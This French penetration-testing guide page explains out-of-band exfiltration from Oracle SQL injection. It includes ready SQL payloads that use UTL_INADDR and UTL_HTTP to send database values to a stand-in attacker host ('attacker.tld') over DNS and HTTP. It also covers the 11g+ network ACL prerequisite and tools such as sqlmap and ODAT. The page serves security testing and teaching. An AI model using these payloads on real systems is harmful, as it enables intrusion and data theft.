---
order: 7
title: "Exfiltration hors bande depuis une injection Oracle"
description: "Exfiltrer des données Oracle via DNS et HTTP avec UTL_INADDR, UTL_HTTP et HTTPURITYPE, et l'ACL 11g+ qui les conditionne."
keywords:
  - hors bande
  - UTL_HTTP
  - UTL_INADDR
  - HTTPURITYPE
  - exfiltration DNS
  - ACL Oracle
---

# Hors bande

Oracle est bien adapté à l'exfiltration hors bande car il livre des paquets qui effectuent des requêtes réseau, de sorte que même une injection entièrement aveugle peut pousser des données vers un serveur de l'attaquant, à condition que l'ACL réseau l'autorise.

L'exfiltration DNS intègre la valeur dans un nom d'hôte qu'un résolveur recherche. `UTL_INADDR.GET_HOST_ADDRESS` effectue une recherche directe :

```sql
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.tld') FROM dual) IS NOT NULL-- 
```

Le serveur de noms de l'attaquant pour `attacker.tld` journalise `<user>.attacker.tld`. L'exfiltration HTTP envoie la valeur dans une URL, ce qui transporte aussi plus de données par requête :

```sql
' AND UTL_HTTP.REQUEST('http://attacker.tld/'||(SELECT user FROM dual)) IS NOT NULL-- 
```

`HTTPURITYPE('http://attacker.tld/'||(SELECT ...)).GETCLOB()` est un autre point de sortie HTTP, et `DBMS_LDAP` et `UTL_TCP` en fournissent d'autres.

La condition préalable critique est la liste de contrôle d'accès. À partir d'Oracle 11g, `UTL_HTTP`, `UTL_INADDR`, `UTL_TCP` et `UTL_SMTP` nécessitent une ACL fine (gérée par `DBMS_NETWORK_ACL_ADMIN`) accordant à l'utilisateur courant l'accès à l'hôte cible, en plus de execute sur le paquet. Sans l'attribution d'ACL, l'appel lève `ORA-24247: network access denied by access control list`. Sur la 10g, il n'y a pas d'ACL et ces appels fonctionnent avec le seul privilège execute. Les valeurs longues ou non sûres pour le DNS sont encodées en hexadécimal et réparties sur plusieurs requêtes. Un listener tel que Burp Collaborator capture à la fois les interactions DNS et HTTP.

## Outils

- **sqlmap** : automatise l'exfiltration DNS (`--dns-domain`) via les paquets `UTL` d'Oracle.
- **ODAT** (Oracle Database Attacking Tool) : exploite les canaux hors bande `UTL_HTTP` et `UTL_INADDR`.
- **Burp Collaborator** : capture les interactions DNS et HTTP que le payload déclenche.

## Références

- Oracle Database PL/SQL Packages and Types Reference : UTL_HTTP, UTL_INADDR, DBMS_NETWORK_ACL_ADMIN
- OWASP Testing Guide : Testing for SQL Injection
